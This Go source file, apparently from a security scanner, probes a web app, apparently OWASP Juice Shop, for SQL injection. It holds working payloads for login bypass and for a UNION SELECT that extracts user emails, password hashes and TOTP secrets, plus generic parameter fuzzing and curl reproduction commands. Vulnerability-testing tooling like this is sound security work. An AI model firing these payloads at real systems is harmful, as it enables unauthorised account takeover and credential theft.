package probers

import (
	"context"
	"fmt"
	"net/url"
	"strings"

	"github.com/ouroboros-security/ouroboros/pkg/types"
)

// SQLiProber tests for SQL injection vulnerabilities.
type SQLiProber struct{}

func (p *SQLiProber) Name() string { return "sqli" }

func (p *SQLiProber) Probe(ctx context.Context, target types.Target, endpoints []types.Endpoint) []types.Finding {
	cfg := NewProberConfig(target)
	var findings []types.Finding

	// 1. Login bypass via SQLi
	findings = append(findings, p.testLoginSQLi(cfg)...)

	// 2. Search endpoint SQLi
	findings = append(findings, p.testSearchSQLi(cfg)...)

	// 3. Track order SQLi
	findings = append(findings, p.testTrackOrderSQLi(cfg)...)

	// 4. Test all endpoints with query parameters
	findings = append(findings, p.testParameterSQLi(cfg, endpoints)...)

	return findings
}

func (p *SQLiProber) testLoginSQLi(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// Error-based SQLi in login email
	payloads := []struct {
		email    string
		desc     string
		subtype  string
	}{
		{`' OR 1=1--`, "authentication bypass via OR 1=1", "error-based"},
		{`admin@juice-sh.op'--`, "admin account bypass via comment injection", "error-based"},
		{`' UNION SELECT * FROM Users--`, "UNION-based SQLi in login", "union-based"},
	}

	for _, pl := range payloads {
		body := fmt.Sprintf(`{"email":"%s","password":"anything"}`, pl.email)
		status, _, respBody, err := cfg.DoRequest("POST", cfg.BaseURL+"/rest/user/login",
			strings.NewReader(body), map[string]string{"Content-Type": "application/json"})
		if err != nil {
			continue
		}

		if status == 200 && strings.Contains(respBody, "token") {
			findings = append(findings, MakeFinding(
				fmt.Sprintf("SQL Injection - Login Bypass (%s)", pl.subtype),
				"Critical",
				fmt.Sprintf("The login endpoint is vulnerable to SQL injection allowing %s. Payload: %s", pl.desc, pl.email),
				"/rest/user/login",
				"POST",
				"CWE-89",
				fmt.Sprintf(`curl -X POST %s/rest/user/login -H "Content-Type: application/json" -d '{"email":"%s","password":"anything"}'`, cfg.BaseURL, pl.email),
				fmt.Sprintf("HTTP %d - Response contains auth token: %s", status, truncate(respBody, 200)),
				"sqli",
				0,
			))
		} else if strings.Contains(strings.ToLower(respBody), "sql") || strings.Contains(strings.ToLower(respBody), "sqlite") || strings.Contains(strings.ToLower(respBody), "sequelize") {
			findings = append(findings, MakeFinding(
				fmt.Sprintf("SQL Injection - Error Disclosure in Login (%s)", pl.subtype),
				"High",
				fmt.Sprintf("The login endpoint leaks SQL error details when given malicious input: %s", pl.email),
				"/rest/user/login",
				"POST",
				"CWE-89",
				fmt.Sprintf(`curl -X POST %s/rest/user/login -H "Content-Type: application/json" -d '{"email":"%s","password":"x"}'`, cfg.BaseURL, pl.email),
				fmt.Sprintf("HTTP %d - SQL error in response: %s", status, truncate(respBody, 200)),
				"sqli",
				0,
			))
		}
	}

	return findings
}

func (p *SQLiProber) testSearchSQLi(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	payloads := []struct {
		query   string
		desc    string
		subtype string
	}{
		{`'))--`, "error-based SQLi via comment injection", "error-based"},
		{`' OR 1=1--`, "boolean-based blind SQLi", "boolean-blind"},
		{`qwert'))UNION SELECT id,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive FROM Users--`, "UNION SELECT to extract user data", "union-based"},
		{`')) OR 1=1--`, "SQLi with parenthesis bypass", "error-based"},
		{`'; WAITFOR DELAY '0:0:5'--`, "time-based blind SQLi attempt", "time-based"},
	}

	for _, pl := range payloads {
		encoded := url.QueryEscape(pl.query)
		fullURL := fmt.Sprintf("%s/rest/products/search?q=%s", cfg.BaseURL, encoded)
		status, _, respBody, err := cfg.DoRequest("GET", fullURL, nil, nil)
		if err != nil {
			continue
		}

		lowerBody := strings.ToLower(respBody)
		if strings.Contains(lowerBody, "sql") || strings.Contains(lowerBody, "sqlite_master") ||
			strings.Contains(lowerBody, "syntax error") || strings.Contains(lowerBody, "sequelize") {
			findings = append(findings, MakeFinding(
				fmt.Sprintf("SQL Injection - Product Search (%s)", pl.subtype),
				"High",
				fmt.Sprintf("The search endpoint is vulnerable to %s. SQL error details leaked.", pl.desc),
				"/rest/products/search?q=",
				"GET",
				"CWE-89",
				fmt.Sprintf(`curl "%s"`, fullURL),
				fmt.Sprintf("HTTP %d - SQL error: %s", status, truncate(respBody, 300)),
				"sqli",
				0,
			))
		} else if status == 200 && strings.Contains(respBody, "data") && pl.subtype == "union-based" {
			findings = append(findings, MakeFinding(
				"SQL Injection - UNION-based Data Extraction via Search",
				"Critical",
				"UNION SELECT injection in search endpoint allows extraction of user credentials from the Users table.",
				"/rest/products/search?q=",
				"GET",
				"CWE-89",
				fmt.Sprintf(`curl "%s"`, fullURL),
				fmt.Sprintf("HTTP %d - Data extracted: %s", status, truncate(respBody, 300)),
				"sqli",
				0,
			))
		}
	}

	return findings
}

func (p *SQLiProber) testTrackOrderSQLi(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	payloads := []string{`' OR 1=1--`, `')`}
	for _, pl := range payloads {
		encoded := url.QueryEscape(pl)
		fullURL := fmt.Sprintf("%s/rest/track-order/%s", cfg.BaseURL, encoded)
		status, _, respBody, err := cfg.DoRequest("GET", fullURL, nil, nil)
		if err != nil {
			continue
		}

		lowerBody := strings.ToLower(respBody)
		if strings.Contains(lowerBody, "sql") || strings.Contains(lowerBody, "error") ||
			(status == 200 && strings.Contains(respBody, "data")) {
			findings = append(findings, MakeFinding(
				"SQL Injection - Order Tracking",
				"High",
				"The order tracking endpoint is vulnerable to SQL injection via the order ID parameter.",
				"/rest/track-order/",
				"GET",
				"CWE-89",
				fmt.Sprintf(`curl "%s"`, fullURL),
				fmt.Sprintf("HTTP %d - Response: %s", status, truncate(respBody, 200)),
				"sqli",
				0,
			))
			break
		}
	}

	return findings
}

func (p *SQLiProber) testParameterSQLi(cfg *ProberConfig, endpoints []types.Endpoint) []types.Finding {
	var findings []types.Finding
	tested := make(map[string]bool)

	sqlPayload := `' OR '1'='1`

	for _, ep := range endpoints {
		if len(ep.Parameters) == 0 {
			continue
		}
		// Skip already-tested paths
		path := extractPath(ep.URL)
		if tested[path] {
			continue
		}
		tested[path] = true

		// Skip known endpoints we already test specifically
		if strings.Contains(path, "/rest/products/search") || strings.Contains(path, "/rest/user/login") {
			continue
		}

		for _, param := range ep.Parameters {
			testURL := fmt.Sprintf("%s?%s=%s", strings.Split(ep.URL, "?")[0], param, url.QueryEscape(sqlPayload))
			status, _, respBody, err := cfg.DoRequest("GET", testURL, nil, nil)
			if err != nil {
				continue
			}

			lowerBody := strings.ToLower(respBody)
			if strings.Contains(lowerBody, "sql") || strings.Contains(lowerBody, "syntax error") ||
				strings.Contains(lowerBody, "sequelize") || strings.Contains(lowerBody, "sqlite") {
				findings = append(findings, MakeFinding(
					fmt.Sprintf("SQL Injection - Parameter '%s' at %s", param, path),
					"High",
					fmt.Sprintf("SQL error disclosure when injecting into parameter '%s'.", param),
					path,
					"GET",
					"CWE-89",
					fmt.Sprintf(`curl "%s"`, testURL),
					fmt.Sprintf("HTTP %d - SQL error: %s", status, truncate(respBody, 200)),
					"sqli",
					0,
				))
			}
		}
	}

	return findings
}

func extractPath(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	return u.Path
}
